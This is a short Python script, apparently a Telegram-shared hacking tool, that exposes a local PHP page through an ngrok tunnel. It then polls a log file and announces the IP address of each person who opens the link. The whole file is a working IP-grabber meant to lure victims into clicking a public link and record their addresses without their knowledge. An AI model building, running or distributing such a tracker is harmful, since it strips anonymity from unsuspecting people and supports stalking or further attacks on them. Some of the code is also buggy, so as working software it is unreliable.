# Coded By :
# TELEGRAM : @Soltan_Python
from pyngrok import ngrok,conf
from subprocess import Popen
import os
from colorama import Fore,init
init()
def symbols(x=list(),end=True,color='LIGHTYELLOW_EX',textt=str()):
    color = color.upper()
    symbol = '┌.┬.│.├.└.┘.┴.┼.┤.┐.─.\n. '.split('.')
    text = str()
    if len(textt) == 0:
        for sy in x:
            text += symbol[sy]
        if end:
            print(Fore.LIGHTYELLOW_EX+text,end="")
        else:
            print(Fore.LIGHTYELLOW_EX+text)
    else:
        for sy in x:
            text += symbol[sy]
        if end:
            exec(f"print(Fore.LIGHTYELLOW_EX+text+Fore.{color}+textt,end='')")
        else:
            exec(f"print(Fore.LIGHTYELLOW_EX+text+Fore.{color}+textt)")

size = 0
def cr_link(port:int()):
    link = ngrok.connect(port,"http").public_url
    symbols([2,11,4,10,10,10],True,'lightmagenta_ex',' [+] '),symbols(end=False,color='lightcyan_ex',textt=link)
    def php():
        with open('log','w') as unknown:
            Popen(("php","-S",f"localhost:{port}","-t","./unknown/index2/"),stderr=unknown,stdout=unknown)            
    php()
    def readip():
        global size
        if not int(os.stat('./unknown/index2/ip.txt').st_size) == int(size):
            size = int(os.stat('./unknown/index2/ip.txt').st_size)
            with open('./unknown/index2/ip.txt') as n:
                i = n.readlines()
            try:
                i = i[-1]
                symbols([11,11,0],True,'cyan',' [+]'),symbols(end=False,color='magenta',textt=' a person opened the link'),symbols([4],True,'lightmagenta_ex',' IP : '),symbols(end=False,color='lightgreen_ex',textt=i)
                with open('./unknown/index2/ip.txt','w') as u:
                    u.write()
            except Exception as e:
                symbols(color='lightgreen_ex',textt=f'[!] error : {e}')
    while True:
        readip()


#########################
##### // @iRLords \\ ####
#########################